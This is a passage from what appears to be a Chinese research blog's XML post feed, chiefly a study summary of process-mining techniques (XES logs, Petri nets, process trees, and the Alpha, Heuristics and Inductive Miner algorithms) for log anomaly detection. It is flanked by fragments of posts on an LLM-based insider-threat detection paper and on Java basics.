href="https://arxiv.org/pdf/2408.08902">https://arxiv.org/pdf/2408.08902</a></li><li>问题：<ul><li>多样化的活动类型和过长的日志文件为LLMs直接识别恶意活动带来了显著的挑战，因为它们需要从众多正常活动中筛选出恶意的行为</li><li>LLMs的“信任幻觉”问题加剧了其在ITD中的应用难度，因为生成的结论可能与用户命令和活动上下文不一致。</li></ul></li><li>研究内容：<br />论文提出了一个多代理日志内部威胁检测框架Audit-LLM。这个框架包括三个协作代理：<br />(i) Decomposer代理，使用连锁思考（COT）推理将复杂的ITD任务分解成可管理的子任务；<br />(ii) Tool Builder代理，为子任务创建可复用的工具，以克服LLMs的上下文长度限制；<br />(iii) Executor代理，通过调用构建的工具生成最终的检测结论。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流程挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『科研』流程挖掘领域关键技术总结</title>
      <link href="/posts/adbe.html"/>
      <url>/posts/adbe.html</url>
      
        <content type="html"><![CDATA[<p>实验室最近的项目需要基于流程挖掘进行日志异常检测任务，本文主要记录在项目研究过程中，对流程挖掘领域的关键技术研究总结。</p><h1 id="流程挖掘基础知识"><a class="markdownIt-Anchor" href="#流程挖掘基础知识"></a> 流程挖掘基础知识</h1><h2 id="xes日志"><a class="markdownIt-Anchor" href="#xes日志"></a> XES日志</h2><p>什么是事件日志：L= [&lt;a,e&gt;^10 ,&lt;a,b,c,e&gt;^5, &lt;a,c,b, e&gt;¹]，次方表示的对应轨迹在日志中出现的次数。</p><p><strong>XES (eXtensible Event Stream)</strong> 是一种基于XML的事件日志标准。它旨在定义一种不同工具和应用领域下交换日志文件的格式。XES主要用于过程挖掘，但同时也可以用于广义数据挖掘、文本挖掘和静态分析。</p><blockquote><p><a href="https://blog.csdn.net/free1985/article/details/75735797">XES格式(过程挖掘)详解_eexes-CSDN博客</a></p></blockquote><ol><li><p><strong>元模型</strong></p><p>XES文件以XML格式编写，包含一个或多个事件日志（<code>log</code>），每个日志包含多个流程实例（<code>trace</code>），而每个流程实例包含一系列事件（<code>event</code>）。</p><ul><li>Log：顶级节点，表示日志，包含多个Trace，即某些具体路径的集合。</li><li>Trace：二级节点，表示一个具体的路径，包含多个Event，即具体事件的集合。</li><li>Event：三级节点，表示一个具体的事件。</li></ul><p>例如，在一个访问网站的日志中，Log表示访问网站，Trace表示某个具体的用户的某次访问网站的过程，Event可以表示诸如“浏览器下载一张图片”的事件。</p></li><li><p><strong>拓展extension</strong></p><p>标签用于定义日志中使用的扩展，常见的扩展有：</p><ul><li><code>Concept</code>：用于描述流程概念，例如事件名称。</li><li><code>Lifecycle</code>：表示事件的生命周期状态（如“start”、“complete”）。</li><li><code>Time</code>：用于定义时间戳信息。</li></ul></li><li><p><strong>属性Key</strong></p><p>XES本身不具有对任何特定工具和应用领域的预定义。它们需要通过定义扩展，即Extension以及属性Attribute来进行表达。XES支持的属性类型包括字符串、日期、整型、浮点型、布尔、ID（即唯一值）等，同时它支持属性的嵌套。 XES使用Classifier标签对事件分类。</p><ul><li>**全局属性global：**global元素用于定义事件日志中所有实例或事件共享的属性，可以是<code>trace</code>或<code>event</code>作用域。</li><li><strong>属性类型：包括string、date等</strong></li><li><strong>属性值：在key标签中，key表示属性名，value为属性值</strong></li></ul></li><li><p><strong>classifier</strong></p><p>classifier标签用于定义事件分类的方式，如按“活动”分类（Activity），分类器指定了如何根据一个或多个键将事件分组。</p></li></ol><h2 id="流程挖掘方法"><a class="markdownIt-Anchor" href="#流程挖掘方法"></a> 流程挖掘方法</h2><p>学习参考：<a href="https://so.csdn.net/so/search?q=%E6%B5%81%E7%A8%8B%E6%8C%96%E6%8E%98&amp;t=blog&amp;u=bzl_bf">流程挖掘- CSDN搜索</a></p><ol><li><p><strong>定义</strong></p><p>流程挖掘（PM，Process Mining）是从现有事件日志中挖掘知识以发现、监控和改进实际流程。流程挖掘从事件日志中挖掘实际流程的潜在知识和信息，可以把流程挖掘归类为数据挖掘。然而，很多数据挖掘方法并没有对实际流程的事件日志进行挖掘的研究，因此流程挖掘弥补了这一缺口。</p><blockquote><p>从流程挖掘的定义来看，流程挖掘并没有限定你使用什么方法，只要是对实际流程的事件日志挖掘知识和信息，不管你是用过程发现（PD，Process Discovery）算法、一致性检验（CC，Conformance Checking），还是用决策树算法、关联规则分析等，都可以说你是在流程挖掘。因此，<strong>流程挖掘确实就是数据挖掘在流程层面的数据上的应用</strong>，当你打算在流程数据上做分析，或者你的工作本身就是与流程和流程数据打交道，流程挖掘的方法和数据挖掘的方法都是值得学习和使用的。（数据挖掘的方法一样可以应用于流程挖掘上面）</p></blockquote></li><li><p><strong>分类</strong></p><p>1）<strong>过程发现（Process Discovery）</strong></p><p>根据事件日志数据创建流程模型，不需要先验知识</p><p>2）<strong>一致性检验（Conformance Checking）</strong></p><p>在已经构建一个标准流程模型（理想情况）的情况下，希望确保实际执行的流程符合这一标准。通过将实际生成的流程模型（依据日志中记录的执行轨迹）与预期的流程模型进行对比，识别出不一致的地方。</p><p>缺点：</p><ul><li>如果不存在标准流程模型，则需要借助过程发现技术从事件日志中挖掘挖掘流程模型，但因为真实应用场景下的日志中通常包含异常执行信息，所以挖掘得到的日志并不完全标准</li><li>一致性检查技术大都只能从控制流的角度观察异常，即流程中活动的执行顺序没有出现异常，而忽略了存储在日志中根据大量的其他相关数据，这些数据可能存在某些难以发现的潜在风险。</li></ul><p>3）<strong>过程改进（Process Enhancement）</strong></p><p>借助实际流程记录的事件日志中得到的知识和信息，来扩展或改进现有流程（先验模型）的方法。</p></li><li><p><strong>挖掘的视角</strong></p><p>流程挖掘针对事件日志的三种不同的挖掘视角：</p><ul><li>process perspective：流程视角侧重于控制流，即活动的顺序。挖掘这一观点的目标是找到所有可能路径的良好表征，例如用 Petri 网来表示。</li><li>organizational perspective：组织视角侧重于发起者领域，即哪些执行者参与执行活动以及他们之间的关系。目标是通过根据角色和组织单位对人员进行分类来构建组织，或者显示个体执行者之间的关系。</li><li>case perspective：case视角将每一个case看成一个整体。案例视角侧重于案例的属性。案件可以通过其在流程中的路径或处理案件的发起者来表征。案例也可以通过相应数据元素的值来表征。例如，如果一个案例代表医院中患者的特定治疗，那么了解吸烟者和非吸烟者之间的处理时间差异（整个case执行所需要的时间）是很有趣的</li></ul></li></ol><h2 id="流程模型"><a class="markdownIt-Anchor" href="#流程模型"></a> 流程模型</h2><ol><li><p><strong>定义</strong></p><p>流程模型是表示流程的语言，包含控制流式流程模型和声明式流程模型。流程模型包含正式模型和非正式模型。正式模型也称为可运行模型，用于分析和启动；非正式模型用于讨论或文档化。</p><ul><li>案例（Case）<br />是指从流程起到到流程终点的一次运行实例，案例具有案例ID（Case ID），有案例层面的属性，有执行流程的活动轨迹。</li><li>轨迹（Trace）<br />是一串活动序列，是一个案例的执行痕迹，序列中每个元素是案例发生的事件。</li><li>事件（Event）<br />是活动的发生，事件的基本属性有案例ID、活动名称和时间戳，分别指示所属案例、所属执行的活动和执行顺序。事件可以有其他附加属性。</li></ul></li><li><p><strong>分类</strong></p><p>过程模型的目的在于决定什么活动需要执行、以何种方式执行。</p><p>从控制流的角度分析过程，实际活动可以顺序执行，可以选择执行或并发执行，同时相同活动的重复执行也有可能发生。针对不同类型的流程可以构建不同的流程模型。</p><ul><li>有向图(DFG)</li><li>Petri网</li><li>流程树（Process Tree）</li></ul></li></ol><p>接下来介绍几个常见的流程模型</p><h3 id="petri网"><a class="markdownIt-Anchor" href="#petri网"></a> Petri网</h3><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/asynccode" alt="img" /></p><p>Petri网是一种用于描述和分析离散事件系统的数学模型，可以对业务流程进行可视化建模，应用于流程挖掘。可以描述系统的动态行为。</p><ol><li><p><strong>基本组成</strong><br />N = (P,T,F)</p><ul><li><strong>库所（Places）</strong>：用圆圈表示，代表系统中的状态或条件。每个库所可以包含一定数量的标记（tokens），标记的数量表示当前系统的状态。</li><li><strong>变迁（Transitions）</strong>：用矩形或条状方块表示，表示系统中可能发生的事件或动作。当变迁触发时，系统会从一个状态转移到另一个状态。</li><li><strong>弧（Arcs）</strong>：连接库所和变迁，用箭头表示，表示库所和变迁之间的关系。弧表明哪些库所会影响哪些变迁的触发，或哪些变迁会导致哪些库所发生变化。</li><li><strong>标记（Tokens）</strong>：表示系统当前的状态，通常放置在库所中。标记可以通过变迁的触发在库所间移动，从而反映系统状态的变化。</li></ul></li><li><p><strong>工作原理</strong><br />在Petri网中，变迁触发的条件依赖于其前置库所是否有足够的标记。当变迁满足触发条件时：</p><ul><li><p>它会消耗前置库所中的标记。</p></li><li><p>然后在与其后置库所相连的库所中生成标记。</p></li><li><p>系统的状态因此发生变化。</p></li></ul><p>这种标记的传递和变迁的触发描述了系统的动态行为。</p><blockquote><p>Petri网模型在流程发现时会整合所有日志中的路径，如果日志中存在异常操作或不同用户权限会导致产生的流程模型存在噪声:</p><ul><li><p>日志中存在异常数据：预处理清洗或者使用聚类，分离出异常的日志</p><p>问题：低频路径可能被误判为异常，采取频率分析</p></li><li><p>权限、角色：不同的用户权限或角色会导致不同的操作路径。例如，管理员可以直接跳过审批步骤，普通用户则需要走审批流程。这些权限差异会使得Petri网模型包含过多分支和变体，从而增加异常检测的难度。</p><ul><li>基于角色生成不同模型：可以根据角色或权限先对事件日志进行划分，分别生成每个角色特有的Petri网模型。这种方法能确保每个角色的模型只反映对应权限下的正常操作路径，使得异常检测更加准确。</li><li>使用带标签的Petri网（Colored Petri Net）：彩色Petri网是一种扩展版Petri网，可以在库所或变迁上添加不同的颜色标签来表示不同的角色或权限。这样，模型不仅包含操作流程，还能体现权限/角色的不同。异常检测时，如果流程中发生了不符合权限的路径变迁，就会标记为异常。</li></ul></li></ul></blockquote></li><li><p><strong>特性</strong></p><p>Petri网具有一些独特的特性，使其特别适用于并发系统的建模和分析：</p><ul><li><p>并发性（Concurrency）：多个变迁可以同时触发，支持并发行为的建模。</p></li><li><p>同步性（Synchronization）：多个前置条件必须满足才能触发一个变迁，适合描述多个事件同步发生的情况。</p></li><li><p>异步性（Asynchrony）：事件可以独立地触发而不影响其他事件的发生。</p></li><li><p>非确定性（Non-determinism）：当多个变迁在同一时间点可以触发时，系统会随机选择一个变迁进行触发。</p></li></ul></li></ol><h3 id="transition-system"><a class="markdownIt-Anchor" href="#transition-system"></a> transition system</h3><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/asynccode" alt="img" /></p><p>transition system（变迁系统）是一种基础的过程建模方法，它是一种有向图，由状态和变迁组成，节点代表状态，边代表着状态的转化。</p><ul><li>优点：简单</li><li>缺点：没办法体现并行任务，系统中出现并行任务的时候会造成状态爆炸问题</li></ul><h3 id="bpmn"><a class="markdownIt-Anchor" href="#bpmn"></a> BPMN</h3><p>BPMN(Business Process Modeling Notation，业务流程建模与标注)已经成为使用最广泛的业务过程建模语言之一。被许多工具提供商支持，并由OMG制定标准。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/asynccode" alt="img" /></p><h3 id="process-tree"><a class="markdownIt-Anchor" href="#process-tree"></a> Process tree</h3><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/asynccode" alt="img" /></p><p>参考：<a href="https://blog.csdn.net/qq_40420514/article/details/124933789">【几种常见的流程模型介绍】-CSDN博客</a></p><ol><li><p><strong>定义</strong></p><p>一种块结构的流程模型，它是以一种树的形式呈现给用户，其中树的结点由流程树运算符和事件活动组成，叶子节点为事件日志中的活动，非叶子节点则是流程树运算符的集合，流程树运算符包括顺序，排他，并发，循环四种，具体的解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X: 排他运算符;  -&gt; : 顺序运算符;  Q : 循环运算符；  ^ : 并发运算符</span><br></pre></td></tr></table></figure><ul><li><p>排他运算符的规则为一个子过程A与另一个子过程B两个之间没有任何关联，一个子过程A中的活动的后继活动不能在另一个子过程B中，一个子过程B中的活动的后继活动不能在另一个子过程A中，两者互不关联。</p></li><li><p>顺序运算符的规则为从一个子过程A到另一个子过程B有出边，但是无入边，两者总体上只有一方到另一方。</p></li><li><p>并发运算符的规则为一个子过程A既有到另一个子过程的出边，也有另一个子过程B到这个子过程A的入边。两者彼此交叉，并行存在。</p></li><li><p>循环运算符的规则为一个活动从子过程A出发，到达另一个子过程B中，再由B重现回到A。总结为：起于此终于此。</p></li></ul></li><li><p><strong>优势</strong></p><p>在实际执行中，作为块结构模型（block-structured models），分层流程模型，BPMN 不受 <strong>控制流复杂性增长的严重影响，具有良好的可读性和可维护性</strong>，便于流程的设计、沟通与自动化执行。</p></li><li><p><strong>缺点</strong></p><p>petri和BPMN此类基于图的模型均存在以下的问题：</p><p><strong>1）死锁（Deadlock）问题</strong></p><p>假设有一个简化的审批流程模型，涉及两个任务：</p><ul><li><p>任务A：由主管审批。</p></li><li><p>任务B：由财务审批。</p></li></ul><p>在这个模型中，规定只有在主管审批完成后，财务才能进行审批，反之也需要财务审批通过后，主管才能审批。我们可以将这个逻辑用Petri网或其他流程模型表示出来，形成一个环形等待关系。</p><ul><li>执行中：当流程执行到这一步时，主管等待财务的审批完成才能继续，财务也等待主管的审批完成才能继续。这种相互依赖关系导致了一个死锁，因为没有人能首先完成审批，流程将永远停滞在此步骤，无法继续下去，任务也无法完成。</li></ul><p>这种情况在流程模型中很常见，尤其是设计复杂的流程或涉及多方审批时，若没有仔细定义优先顺序或解锁条件，很容易形成死锁。</p><p><strong>2）活锁（Livelock）问题</strong></p><p>假设有一个仓库补货流程，简化为以下两个步骤：</p><ul><li><p>步骤1：检查库存。</p></li><li><p>步骤2：检查供应商是否能发货。</p></li></ul><p>如果库存不足，则需要去供应商那里补货，而供应商检查时发现他们需要仓库确认库存需求，于是仓库再进行检查库存，发现仍然不足，又需要再次请求供应商。由于两个步骤相互依赖，每次执行的条件又彼此触发，流程就会在这两个步骤之间循环，进入一个无限的循环，形成活锁。</p><ul><li>执行中：仓库与供应商之间会不断地重复同样的步骤，每次都是重新检查库存和供应状态，但从未真正达成任何实质性的补货。这种情况下，流程被困在一个循环中，看似有活动在进行，但实际上任务永远无法完成。</li></ul></li></ol><h1 id="流程挖掘领域参考资料"><a class="markdownIt-Anchor" href="#流程挖掘领域参考资料"></a> 流程挖掘领域参考资料</h1><ul><li><p><a href="https://promforum.win.tue.nl/%EF%BC%9A%E6%B5%81%E7%A8%8B%E6%8C%96%E6%8E%98%E7%9A%84%E8%AE%BA%E5%9D%9B%EF%BC%8C%E9%87%8C%E9%9D%A2%E5%8F%AF%E4%BB%A5%E6%8F%90%E5%87%BA%E9%97%AE%E9%A2%98%EF%BC%8C%E8%BF%99%E4%B8%AA%E8%AE%BA%E5%9D%9B%E5%B0%B1%E6%98%AF%E6%B5%81%E7%A8%8B%E6%8C%96%E6%8E%98%E4%B9%8B%E7%88%B6%E5%88%9B%E5%8A%9E%E7%9A%84%EF%BC%8C%E9%87%8C%E9%9D%A2%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98%E9%83%BD%E6%98%AF%E5%8F%AF%E4%BB%A5%E5%9B%9E%E7%AD%94%E7%9A%84%E3%80%82">https://promforum.win.tue.nl/：流程挖掘的论坛，里面可以提出问题，这个论坛就是流程挖掘之父创办的，里面一些基本问题都是可以回答的。</a></p></li><li><p><a href="https://github.com/promworkbench%EF%BC%9A%E8%BF%99%E4%B8%AA%E9%87%8C%E9%9D%A2%E6%9C%89%E5%9F%BA%E4%BA%8EProM%E6%A1%86%E6%9E%B6%E5%AE%9E%E7%8E%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%97%E6%B3%95%EF%BC%8C%E9%83%BD%E6%98%AF%E5%BC%80%E6%BA%90%E7%9A%84%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E9%9C%80%E8%A6%81%E7%9C%8B%E7%9C%8B">https://github.com/promworkbench：这个里面有基于ProM框架实现的一些算法，都是开源的，可以根据需要看看</a></p></li><li><p><a href="https://processintelligence.solutions/">https://processintelligence.solutions/</a> ：一个开源的Python库，里面包括了BPMN等流程模型的实现及可视化界面</p><ul><li>PMTk：一个面向最终用户的工具中包含多种流程挖掘功能，包括流程发现、流程可视化分析和一致性检查。</li><li>PM4py：供学术界和工业界使用，是用 Python 编写的领先的开源流程挖掘库。</li></ul></li><li><p><a href="https://github.com/TheWoops/awesome-processmining%EF%BC%9A%E6%94%B6%E9%9B%86%E4%BA%86%E9%83%A8%E5%88%86%E6%B5%81%E7%A8%8B%E6%8C%96%E6%8E%98%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%BA%90">https://github.com/TheWoops/awesome-processmining：收集了部分流程挖掘相关的资源</a></p></li><li><p><a href="https://leemans.ch/visualminer/home/">https://leemans.ch/visualminer/home/</a> visual miner的实现，一种流程挖掘算法</p></li><li><p>Process Mining Handbook-2022：目前比较新的流程挖掘手册，内容比较多，选取自己需要的部分看就行。里面分模块进行了介绍然后搭配了一些相关论文，可以看看是否有可以借鉴的地方</p></li></ul><h1 id="流程发现算法"><a class="markdownIt-Anchor" href="#流程发现算法"></a> 流程发现算法</h1><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/asynccode" alt="img" /></p><h2 id="传统算法"><a class="markdownIt-Anchor" href="#传统算法"></a> 传统算法</h2><h3 id="直接算法"><a class="markdownIt-Anchor" href="#直接算法"></a> 直接算法</h3><p><strong>直接算法的基本思想是直接对事件日志进行全盘扫描, 从中找出具有特定规律的模式。</strong></p><p>α 算法和相关改进算法是此类方法的典型代表</p><p>Alpha算法：</p><ol><li><p>原理：<a href="https://zhuanlan.zhihu.com/p/546250991">流程发现算法第1讲| Alpha算法</a></p><p>基于事件日志中活动之间的<strong>直接因果关系</strong>、<strong>并发关系</strong>和<strong>顺序关系</strong>，构建模型，可以用petri网表示。</p></li><li><p><strong>主要步骤</strong></p><p>Step 1️⃣：从事件日志中提取活动集（A）</p><ul><li>收集所有出现在日志中的活动，构成活动集合 A。</li></ul><p>Step 2️⃣：识别直接跟随关系（→）</p><ul><li>比如：如果在某些轨迹中活动 A 总是直接出现在 B 前面，则认为 A → B。</li></ul><p>Step 3️⃣：识别不同类型的关系</p><ul><li>顺序（A → B）</li><li>并发（A || B，A 和 B 可交换）</li><li>无关（A # B，A 和 B 没有直接联系）</li></ul><p>Step 4️⃣：构造“前集-后集”的模式</p><ul><li>推断可能的起点、终点，以及中间的连接结构（例如：{A} → {B, C}）。</li></ul><p>Step 5️⃣：生成 Petri 网（或其他模型）</p><ul><li>将关系映射为 Petri 网元素，构建模型</li></ul></li><li><p>特点</p><p>1）优点：简单、成熟</p><p>2）缺点：不能处理复杂结构和噪声</p><ul><li><p>α 算法的应用需要一个重要前提, 即日志完备且没有噪声。Alpha算法通过分析事件日志中的活动顺序来识别活动之间的关系。它依赖于“直接跟随”关系来推导出活动间的因果关系、并行关系和其他依赖关系。如果日志数据缺失或记录错误，这些活动之间的顺序关系将不准确，导致错误的关系推断。</p></li><li><p>不能处理不明显的依赖关系。Alpha算法只识别明显的直接关系，对于间接关系或复杂的依赖结构处理不足。例如，如果某个活动的发生依赖于多个其他活动的组合，Alpha算法可能无法正确识别这种复杂的依赖。</p></li><li><p>并行活动的处理： 对于并行活动的处理，Alpha算法可能将实际上是顺序或选择关系的活动误判为并行关系。这是因为算法认为如果活动A直接跟随活动B，且B也直接跟随A，那么这两个活动是并行的。然而，这种简单的规则可能无法准确识别真正的并行关系。</p><blockquote><p>Alpha+算法解决了这个问题</p></blockquote></li><li><p>无法处理循环结构： Alpha算法的基本版本不支持处理日志中的循环结构</p><blockquote><p>例如：假设我们有一个简单的工作流，其中包括三个活动：A, B, 和 C。活动流程如下：</p><p>活动A开始，之后过渡到活动B。</p><p>活动B完成后，可以返回到活动A，形成一个循环。</p><p>活动B也可以过渡到活动C，然后结束。</p><p>这个工作流的活动日志可能看起来是这样：</p><ul><li>案例1: A, B, A, B, A, B, C</li><li>案例2: A, B, C</li><li>案例3: A, B, A, B, C</li></ul><p>在这个例子中，活动B之后直接跟随两种活动：A（循环回去）和C（继续往下执行）。根据Alpha算法：</p><ul><li>活动B直接跟随活动A和活动C，反之，活动A也直接跟随活动B。</li><li>这导致算法可能会推断出A与B之间可能存在并行关系（因为A和B相互直接跟随），这显然是错误的。</li></ul></blockquote></li><li><p>短路循环和长距离依赖： 短路循环（即循环迭代次数非常少的情况）和长距离依赖（活动之间的依赖关系在日志中不频繁或间隔很远）也是Alpha算法难以处理的。这些情况下，由于算法依赖频繁和近距离的活动模式，可能无法形成正确的因果关系。</p></li><li><p>可扩展性问题： Alpha算法在面对大型数据集或高复杂度的日志数据时，性能可能会显著下降。算法的时间复杂度和空间复杂度会随着活动类型的增加而显著增加。</p></li></ul></li></ol><h3 id="heuristics-miner启发式挖掘算法"><a class="markdownIt-Anchor" href="#heuristics-miner启发式挖掘算法"></a> Heuristics Miner(启发式挖掘算法)</h3><ol><li><p>原理：<a href="https://www.jianshu.com/p/6496ac2d5c20">流程发现算法第3讲|Heuristic Miner</a></p><p>基于一种假设：噪声日志在正确日志中所占的比例很小。启发式算法的基本思想是基于此基本假设, 在挖掘事件日志时, 考虑流程实例出现的频率, 从概率统计的角度识别噪声, 通过设定阈值, 将低频实例作为噪声过滤掉。</p></li><li><p>主要步骤</p><p>Step 1️⃣：构建频率表（频次矩阵）</p><ul><li>统计日志中各活动对（A→B）的出现次数。</li></ul><p>Step 2️⃣：计算活动节点之间的依赖度（Dependency Measure）</p><ul><li><p>比如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20250407142303944.png" alt="image-20250407142303944" /></p></li><li><p>这个值表示 A 导致 B 的可能性。</p></li></ul><p>Step 3️⃣：设置阈值过滤</p><ul><li>去除低频路径或不可靠的关系，降低噪声影响。</li></ul><p>Step 4️⃣：构建依赖图（Dependency Graph）</p><ul><li>用边权表示活动之间的依赖强度，构建带权有向图。</li></ul><p>Step 5️⃣：从依赖图生成模型</p><ul><li>通常构造流程图（或转换为Petri网），形成可视化模型。</li></ul></li><li><p>模型结构</p><p>边上面的数字表示权重，反映了所连接的两个事件之间关系的强度或依赖度。最直观一般用频率来表示权重，即一个活动直接跟随另一个活动出现的次数。这个数字说明在过程中，一个活动（A）完成后紧接着启动另一个活动（B）的实例数量。</p></li><li><p>特点</p><ul><li>优点：解决了噪声处理问题</li><li>缺点：易误删低频有效行为，导致挖掘模型不能反映实际情况</li></ul></li></ol><h3 id="基于概率统计的方法"><a class="markdownIt-Anchor" href="#基于概率统计的方法"></a> 基于概率统计的方法</h3><ol><li><p>原理：概率、统计学以及随机过程理论，以处理不确定性、复杂的依赖关系以及流程中的随机性。</p></li><li><p>分类</p><ul><li>马尔可夫 (Markov) 模型</li><li>随机活动图 (SAG) 算法</li><li>增量分析</li><li>Apriori 算法</li><li>随机 Petri 网等</li></ul></li><li><p>特点：</p><p>1）优点：与 Alpha 算法和启发式算法等专注于流程建模不同，概率统计方法在流程挖掘中侧重于流程优化和异常检测，帮助识别流程中的缺陷，提高流程的效率和合规性。这些方法不仅可以发现高效的活动组合，还能够量化并检测异常路径，从而发现和解决流程中的潜在问题。</p><p>2）缺点：适用性不大，依附性强</p></li></ol><h3 id="inductive-miner归纳式挖掘方法"><a class="markdownIt-Anchor" href="#inductive-miner归纳式挖掘方法"></a> Inductive Miner（归纳式挖掘方法）</h3><ol><li><p><strong>原理</strong>：将日志分解成可解释的子日志，逐步递归地构建出流程树。</p></li><li><p><strong>主要步骤</strong></p><p>Step 1️⃣：构建直接跟随图（Directly-Follows Graph, DFG）</p><ul><li>分析日志中事件的前后关系，构建一个图表示活动之间的直接关系。</li></ul><p>Step 2️⃣：递归分解（Detect Cut）</p><ul><li>判断 DFG 是否可以拆分为以下结构之一：<ul><li>顺序（Sequence）</li><li>并发（Parallel）</li><li>选择/分支（XOR）</li><li>循环（Loop）</li></ul></li><li>如果可以，就将日志拆分成子日志，并继续对子日志做相同处理（递归）。</li></ul><p>Step 3️⃣：构建流程树（Process Tree）</p><ul><li>每次切割都作为树的一个节点，最终构建出一棵包含控制结构的流程树。</li></ul><p>Step 4️⃣：转化为模型（如Petri网）</p><ul><li>最后将流程树映射为具体的模型表示，用于可视化或后续分析。</li></ul></li><li><p><strong>优点</strong>：高鲁棒性，能够处理复杂流程，发现结构良好、块结构清晰的流程模型。支持<strong>顺序、并发、选择、循环</strong>等结构，且天然保证模型的<strong>结构正确性和可解释性</strong>。</p></li></ol><h2 id="基于机器学习的方法"><a class="markdownIt-Anchor" href="#基于机器学习的方法"></a> 基于机器学习的方法</h2><p>此类流程算法主要来自于数据挖掘相关技术在流程挖掘领域的应用, 相比于传统流程挖掘算法, 此类技术的整体成熟性还不够, 大部分还未能达到很好的挖掘效果</p><h3 id="基于智能优化的流程挖掘算法"><a class="markdownIt-Anchor" href="#基于智能优化的流程挖掘算法"></a> 基于智能优化的流程挖掘算法</h3><ol><li><p>原理：<a href="https://zhuanlan.zhihu.com/p/157335206">人工智能：智能优化算法综述</a></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20250331162716600.png" alt="image-20250331162716600" /></p></li><li><p>特点</p><p>1）优势</p><ul><li>可以处理大多数的控制流结构，准确率高</li><li>鲁棒性好，可以很好的处理噪声</li><li>基于局部次序关系的全局搜索，有利于得到全局优化的结果</li><li>适应度函数的自由设置, 便于得到更符合用户倾向的流程模型</li></ul><p>2）缺点：算法效率太低, 容易产生死锁等问题, 可在质量和效率两方面进行改进</p></li><li><p>方法</p><ul><li>遗传算法</li><li>模拟退火算法</li><li>禁忌搜索算法</li><li>粒子群</li></ul></li></ol><h3 id="模糊挖掘"><a class="markdownIt-Anchor" href="#模糊挖掘"></a> 模糊挖掘</h3><ol><li><p>原理：传统流程挖掘技术有很多显现或者隐含的假设, 使其在结构化流程上表现良好, 但应用于结构化程度低的流程, 无法提供具有洞察力的模型。这不是说传统技术挖掘的模型不正确, 而是挖掘的模型显示了所有细节, 没有从事件日志本身提供任何有意义的抽象, 因此对于流程分析师来说是无用的。</p></li><li><p>流程：</p><ul><li>使用已有控制流挖掘算法挖掘出业务流程的 控制流模型</li><li>识别过程模型中的决策点。以 Petri 网为例, 若 Petri 网中某一库所对应了多个 输出弧, 则可被判定为决策点。</li><li>使用决策树分析过程模型中的决策点。在对过程模型中的决策点进行识别之后, 需要判定过程实例的数据属性是否对实例的决策产生影响, 即决策规则挖掘, 其思想就是将每一个决策点转换为一个分类问题, 具体类别则是作出的不同决策</li></ul></li><li><p>特点：</p><p>1）优点：可以处理复杂的流程结构</p><p>2）缺点：需要找到高适应性的默认参数设置或易操作的合理参数，费时费力</p></li></ol><h3 id="决策挖掘"><a class="markdownIt-Anchor" href="#决策挖掘"></a> 决策挖掘</h3><ol><li>原理：事件日志中包含着大量的事件属性信息, 如时 戳、执行者和一些附加数据等, 目前的流程挖掘算法 更多的是利用前两个属性来构造反映因果相关性的流程模型, 即基于控制流视角的流程发现, 而对日志中其他数据利用较少, 无法解释活动为何被选择执行。<br />决策挖掘通过决策树分析技术分析日志中的各种数据信息如何影响具体的流程实例进行决策, 即得到决策规则, 关注流程挖掘的案例视角</li></ol>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流程挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『安全开发』JAVA安全开发（一）Java基础</title>
      <link href="/posts/c180.html"/>
      <url>/posts/c180.html</url>
      
        <content type="html"><![CDATA[<p>这一系列旨在从安全的视角来学习Java开发，聚焦于JavaEE开发，主要目的在于快速学习并读懂 JavaEE 的开发代码。</p><p>本文主要对Java的基础知识、开发基础进行介绍</p><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><h2 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h2><ol><li><p><strong>概念</strong></p><p>Java 是一种面向对象的编程语言，广泛用于开发各种应用程序，包括 Web 应用、移动应用、企业级系统和嵌入式系统等。</p></li><li><p><strong>特点</strong></p><ul><li><p><strong>面向对象编程</strong>：Java 是一种基于对象的语言，支持继承、多态、封装和抽象等 OOP 概念。</p><p>通过对象和类的定义，Java 能够实现模块化的代码结构，易于维护和扩展。</p></li><li><p><strong>跨平台性</strong>：Java 使用 <code>JVM</code>来实现跨平台功能，具有“Write Once, Run Anywhere”（一次编写，到处运行）的特点。不同操作系统上安装的 JVM 能够解释相同的 Java 字节码，因此 Java 程序可以在任何支持 JVM 的系统上运行。</p></li></ul></li><li><p><strong>版本</strong></p><p>Java 可以分为三大版本：</p><ul><li>SE即标准版，包含了Java核心类库，主要用来开发桌面应用；</li><li>EE即企业版，包含SE，又有扩展部分（Servlet，JDBC等），主要用来开发分布式网络程序；</li><li>ME即微型版，包含了SE中部分类库，又有自己扩展部分，主要用来做移动类、嵌入式开发。</li></ul></li></ol><h2 id="相关名词解释"><a class="markdownIt-Anchor" href="#相关名词解释"></a> 相关名词解释</h2><ol><li><p><strong>Java运行环境与开发工具</strong></p><ul><li><p><strong>JDK（Java Development Kit）</strong></p><p>JDK 是 Java 开发工具包，它提供了 Java 的开发环境（提供了编译器 javac 等工具，用于将 java 文件编译为 class 文件）和运行环境（提 供了 JVM 和 Runtime 辅助包，用于解析 class 文件使其得到运行）。如果你下载并安装了 JDK，那么你不仅可以开发 Java 程序，也同时拥有了运行 Java 程序的平台。JDK 是整个 Java 的核心，包括了 Java 运行环境（JRE），一堆 Java 工具 tools.jar 和 Java 